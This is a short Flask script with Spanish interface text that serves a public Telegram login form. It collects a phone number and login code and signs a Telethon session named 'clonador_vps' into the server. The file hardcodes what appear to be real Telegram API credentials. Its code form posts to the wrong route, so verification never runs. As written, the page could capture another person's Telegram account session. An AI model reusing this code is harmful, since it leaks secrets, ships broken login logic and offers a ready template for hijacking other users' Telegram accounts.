from flask import Flask, request, render_template_string
from telethon.sync import TelegramClient
import asyncio

API_ID = 33989014
API_HASH = "4b7297e5304136c94e1178530ef82f55"

app = Flask(__name__)

client = TelegramClient("clonador_vps", API_ID, API_HASH)

PHONE_HTML = """
<h2>Login Telegram</h2>
<form method="POST">
    <input type="text" name="phone" placeholder="+573001112233">
    <button type="submit">Enviar código</button>
</form>
"""

CODE_HTML = """
<h2>Coloca el código</h2>
<form method="POST">
    <input type="text" name="code" placeholder="12345">
    <button type="submit">Verificar</button>
</form>
"""

phone_number = None

@app.route("/", methods=["GET", "POST"])
def login():
    global phone_number

    if request.method == "POST":
        phone_number = request.form["phone"]

        async def send():
            await client.connect()
            await client.send_code_request(phone_number)

        asyncio.run(send())

        return render_template_string(CODE_HTML)

    return render_template_string(PHONE_HTML)

@app.route("/verify", methods=["POST"])
def verify():
    code = request.form["code"]

    async def verify_code():
        await client.sign_in(phone_number, code)

    asyncio.run(verify_code())

    return "✅ Telegram conectado correctamente"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)